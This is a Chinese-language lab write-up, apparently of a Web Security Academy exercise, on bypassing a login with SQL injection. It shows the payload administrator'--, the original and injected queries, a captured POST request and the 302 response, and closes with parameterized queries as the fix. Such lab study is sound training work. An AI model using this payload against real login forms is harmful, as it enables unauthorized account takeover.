# SQLi · 登录绕过（注释符）

日期：2026-10-23　标签：SQLi

## 1. 题目要求

登录 administrator 账号。

## 2. 直接做法

在 Username 输入框填入：

```
administrator'--
```

原因：`--` 注释掉了 password 的判断。

原始 SQL：

```sql
SELECT * FROM users WHERE username='administrator' AND password='???'
```

注入后：

```sql
SELECT * FROM users WHERE username='administrator'--' AND password='???'
```

## 3. 抓包做法

payload：

```
POST /login HTTP/2
Host: 0adf00af041a82ea806da37e00f7002f.web-security-academy.net
Cookie: session=h4HIG89rctmrWTlpPn5NvZIOcBcxnPsF
Content-Length: 76
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

csrf=BkmlqAOsN3ekefgDGd3hurqvnQycrN0u&username=administrator'--&password=123
```

关键 payload：

```
csrf=BkmlqAOsN3ekefgDGd3hurqvnQycrN0u&username=administrator'--&password=123
```

区分 GET 包和 POST 包：GET 参数在 URL，POST 参数在 body（空行下面）。

response：

```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=7VlYsA4g8odmxHjjxehSzBLDsOw6Ra0o; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

302 表示重定向，是“登录成功绕过”的信号；`Location` 指示跳转地址，`Set-Cookie` 是新的 Cookie。

## 4. 怎么防

成因：单引号没被当作数据，而被当作代码。

方向：参数化查询，让输入永远是数据，不能改变语句结构。
